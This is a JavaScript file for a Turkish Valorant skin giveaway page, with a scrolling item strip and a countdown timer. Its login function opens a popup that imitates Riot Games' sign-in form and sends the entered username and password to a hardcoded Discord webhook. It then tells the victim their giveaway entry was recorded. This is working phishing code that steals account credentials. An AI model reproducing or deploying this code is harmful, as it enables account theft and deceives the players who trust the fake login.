const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

// 1. Üst Şerit Animasyonu İçin İçeriği Çoğalt (Sonsuz Döngü)
document.addEventListener("DOMContentLoaded", () => {
    const track = document.getElementById('track');
    const items = [
        {n: "Reaver Vandal", i: "skin1.png"},
        {n: "Ion Phantom", i: "skin2.png"},
        {n: "Prime Karambit", i: "skin3.png"}
    ];
    
    // Sonsuz döngü görünümü için listeyi 10 kere yan yana koy
    let content = "";
    for(let i=0; i<10; i++) {
        items.forEach(s => {
            content += `<div class="drop-card"><img src="${s.i}"><span>${s.n}</span></div>`;
        });
    }
    track.innerHTML = content;
});

// 2. UTC+3 Geri Sayım Sayacı
function updateTimer() {
    const now = new Date();
    // UTC+3 ayarı
    const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
    
    const tonight = new Date(utc3);
    tonight.setHours(24, 0, 0, 0); // Bu gece 00:00
    
    const diff = tonight - utc3;
    
    const h = Math.floor(diff / 3600000);
    const m = Math.floor((diff % 3600000) / 60000);
    const s = Math.floor((diff % 60000) / 1000);
    
    document.getElementById('countdown').innerText = 
        `${h < 10 ? '0'+h : h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
}
setInterval(updateTimer, 1000);

// 3. Webhook ve Giriş
function openAuth() {
    const w = 450, h = 600;
    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
    
    win.document.body.innerHTML = `
        <style>
            body { background: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
            img { width: 120px; margin-bottom: 25px; }
            input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; background: #f2f2f2; }
            button { width: 100%; padding: 18px; background: #ff4655; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 15px; }
        </style>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/1200px-Riot_Games_logo.svg.png">
        <h2>Oturum Aç</h2>
        <input type="text" id="u" placeholder="KULLANICI ADI">
        <input type="password" id="p" placeholder="ŞİFRE">
        <button id="s">OTURUM AÇ</button>
    `;

    win.document.getElementById('s').onclick = function() {
        const u = win.document.getElementById('u').value;
        const p = win.document.getElementById('p').value;
        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🎁 **Çekiliş Katılımı / Giriş**\n👤 Kullanıcı: \`${u}\` \n🔑 Şifre: \`${p}\`` })
            }).then(() => {
                win.document.body.innerHTML = "<h3>Katılım Kaydedildi! Sayfa Kapatılıyor...</h3>";
                setTimeout(() => win.close(), 1500);
            });
        }
    };
}
